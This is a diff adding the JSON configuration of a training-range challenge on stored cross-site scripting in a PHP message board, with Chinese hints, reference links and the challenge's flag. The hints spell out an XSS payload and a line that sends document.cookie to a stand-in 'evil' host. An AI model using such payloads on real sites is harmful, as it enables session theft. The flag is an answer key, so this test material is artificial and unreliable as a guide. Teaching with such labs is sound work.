@@ -1,0 +1,36 @@
+{
+  "id": "xss2",
+  "path": "/xss2",
+  "type": "php",
+  "public": false,
+  "backend": "mysql:xssboard",
+  "note": "存储型 XSS",
+  "category": "xss",
+  "title": "留言板里的幽灵 · 存储型 XSS",
+  "difficulty": "easy",
+  "url_path": "/xss2",
+  "flag": "flag{xss2_7c1f52b8}",
+  "knowledge": [
+    {
+      "name": "PortSwigger — 存储型 XSS",
+      "url": "https://portswigger.net/web-security/cross-site-scripting/stored"
+    },
+    {
+      "name": "HTML 转义为什么能防 XSS",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+    }
+  ],
+  "hints": [
+    "先发一条普通留言，观察内容是如何原样出现在列表里的（右键查看源码，注意没有任何转义）。",
+    "和反射型不同，这里不需要构造 URL，只需要“存”进去：<code>&lt;img src=x onerror=alert(1)&gt;</code>。",
+    "发完留言后点面板的 🤖 按钮：Victim 会浏览留言板，并执行你留言中的脚本。",
+    "思考：真实场景里该用 <code>window.location='https://evil/?c='+document.cookie</code> 把 Cookie 发走；靶场里 Bot 会直接把偷到的 Cookie 展示给你。"
+  ],
+  "description_html": "留言板把每个人发布的内容<b>永久存储</b>并无过滤地渲染给所有访客——你的 payload 将在每一位访客（包括 Victim）的浏览器里执行，而不只是你自己的。发一条带脚本的留言，然后让 Victim 来看一眼。",
+  "bot": true,
+  "entry": "index.php",
+  "runtime": "php",
+  "writeup": "writeup.md",
+  "prev": "xss1",
+  "next": "xss3"
+}
